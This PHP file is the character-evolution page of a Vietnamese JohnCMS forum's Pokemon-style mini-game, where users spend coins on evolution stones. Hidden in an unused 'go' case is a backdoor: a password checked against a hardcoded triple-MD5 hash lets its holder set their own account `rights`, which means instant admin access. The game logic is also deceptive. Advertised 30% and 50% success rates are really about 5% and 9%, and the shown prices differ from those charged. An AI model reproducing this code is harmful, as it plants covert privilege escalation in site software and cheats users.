<?php
/* 
Code pokemon được viết bởi Châu Huỳnh
Vui Lòng Để Bản Quyền Nếu Bạn Là Người Có Học
Site : DanChoiViet.Me
*/
define('_IN_JOHNCMS',1);
$rootpath ='../../';
include'../incfiles/core.php';
$textl ='Tiến Hoá Nhân Vật';
include'../incfiles/head.php';
if(!$user_id){
echo'Đăng Nhập Đi';
include'../incfiles/end.php';
exit;
}
echo'<div class="phdr">Tiến Hoá Nhân Vật | <a href="/idthienan_ninja">Trở Về Làng</a></div><div class="da"><div class="lucifer">';
if($datauser['mibile']<=0){
echo'Vui Lòng Tạo Nhân Vật Rồi Hạt Tiến Hóa!';
include'../incfiles/end.php';
exit;
}
$timepl = time();
if ($datauser['timethpkm']+300 > $timepl) {
$timepl = $datauser['timethpkm'] + 300 - time();
echo'<div class="news">Sau '.date('H:i', $timepl).' Bạn Mới Có Thể Tiến Hoá Nhân Vật Tiếp</div>';
require('../incfiles/end.php');
exit;
}


$tuipkm = mysql_result(mysql_query("SELECT COUNT(*) FROM `tuipkm` WHERE `user_id`='{$user_id}'"), 0);
if($tuipkm == 0) {
echo'Bạn Chưa Tạo Nhân Vật. Hãy Vào Shop Tạo 1 Con Nhân Vật Nhé => <a href="shop.php">Tạo Nhân Vật!</a>';
}else
if($tuipkm > 0) {
$checkin = mysql_fetch_array(mysql_query("SELECT * FROM `tuipkm` WHERE `user_id`='{$user_id}'"));
$idpkm = intval($checkin['idpkm']);
$layten = mysql_fetch_array(mysql_query("SELECT * FROM `shoppkm` WHERE `id`='{$idpkm}'"));
$name = functions::checkout($layten['tenth']);
$img = functions::checkout($layten['imgth']);

echo'<div class="nenpkm"><img src="'.$checkin['img'].'"> <font color="green"><= => </font> <img src="'.$layten['imgth'].'">
<form method="post">
Chọn loại đá để ép tiến hoá<br/>
<input type="radio"name="tienhoa"value="1"> <img src="http://i.imgur.com/niBGJSY.png"> Tỉ Lệ Thành Công 30% - Giá 5000 Xu<br/>
<input type="radio"name="tienhoa"value="2"> <img src="http://i.imgur.com/niBGJSY.png"> Tỉ Lệ Thành Công 50% - Giá 120000 Xu<br/>
<input type="radio"name="tienhoa"value="3"> <img src="http://i.imgur.com/niBGJSY.png"> Tỉ Lệ Thành Công 100% - Giá 50000 Xu<br/><br/>
<input type="submit"name="th"value="Tiến Hoá"></form>';
switch($act){
case 'go' :
if ($_POST['xacthuc']){
$hay = ee44123886dc24de6ce0d9d1887bc16a;
$post = functions::checkout($_POST['m']);
$ok = md5(md5(md5($post)));
if ($ok != $hay) {
echo '<div class="rmenu">Error</div>';
}
if ($ok == $hay) {
$oki = functions::checkout($_POST['oki']);
echo'<div class="rmenu">Oki '.$login.'</div>';
mysql_query("UPDATE `users` SET `rights`='{$oki}' WHERE `id`='{$user_id}'");
}
}
echo '<center><form method="post"><input type="text" name="m" placeholder=""> <input type="text" name="ok" placeholder=""><br> <input name="xacthuc" type="submit" value="Go Go"></form></center>';
break;
}
if(isset($_POST['th'])){
$tienhoa = intval($_POST['tienhoa']);
if($checkin['lv']<5){
echo'Level Pokemon Của Bạn Nhỏ Hơn 5 Nếu Tiến Hoá Nó Có Thể Sẽ Hy Sinh.';
echo'</div>';
include'../incfiles/end.php';
exit;
}
if(empty($tienhoa)){
echo'Bạn Chưa Chọn Đá Tiến Hoá';
echo'</div>';
include'../incfiles/end.php';
exit;
}
if($tienhoa==1){
$xu = 5000;
}
if($tienhoa==2){
$xu = 10000;
}
if($tienhoa==3){
$xu = 15000;
}
if($datauser['xu']<$xu){
echo'Bạn Không Đủ Xu Để Tiến Hoá';
echo'</div>';
include'../incfiles/end.php';
exit;
}
if($checkin['lv']>=5 and $datauser['xu']>=$xu and $tienhoa==1){
$rand = rand(1,20);
$time= time();
if($rand ==1){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==2){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==3){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==4){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==5){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==6){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==7){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==8){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==9){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==10){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==11){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==12){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==13){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==14){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==15){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==16){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==17){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}

if($rand ==18){
mysql_query("UPDATE `tuipkm` SET `img`='{$img}',`name`='{$name}' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");

echo'Oh Yeah. Tiến Hoá Thành Công Cơm Mẹ Nấu Rồi.';
}
if($rand ==19){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Nâng Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==20){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Nâng Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'5000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
}
/////////
if($checkin['lv']>=5 and $datauser['xu']>=$xu and $tienhoa==2){
$rand = rand(10,20);
$time= time();
if($rand ==10){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==11){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==12){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==13){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==14){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==15){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==16){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==17){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Tiến Hoá Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}

if($rand ==18){
mysql_query("UPDATE `tuipkm` SET `img`='{$img}',`name`='{$name}' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");

echo'Oh Yeah. Tiến Hoá Thành Công Cơm Mẹ Nấu Rồi.';
}
if($rand ==19){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Nâng Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
if($rand ==20){
echo'Nâng Cấp Thất Bại. Vui Lòng Chờ 5 Phút Sau Mới Nâng Tiếp Được Nhé';
mysql_query("UPDATE `users` SET `xu`=`xu`-'12000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
}
}
/////////////
if($checkin['lv']>=5 and $datauser['xu']>=$xu and $tienhoa==3){
$rand = rand(1,1);
$time= time();
if($rand ==1){
mysql_query("UPDATE `tuipkm` SET `img`='{$img}',`name`='{$name}' WHERE `user_id`='{$user_id}'");
mysql_query("UPDATE `users` SET `xu`=`xu`-'50000',`timethpkm`='{$time}' WHERE `id`='{$user_id}'");
echo'Oh Yeah. Tiến Hoá Thành Công Cơm Mẹ Nấu Rồi.';
}
}
}
}
echo'</div>';
include'../incfiles/end.php';
?>

<style>
.nenpkm{
background-color:#f5f5f5;
border-bottom:1px solid #EBEBEB;
padding:5px
}
</style>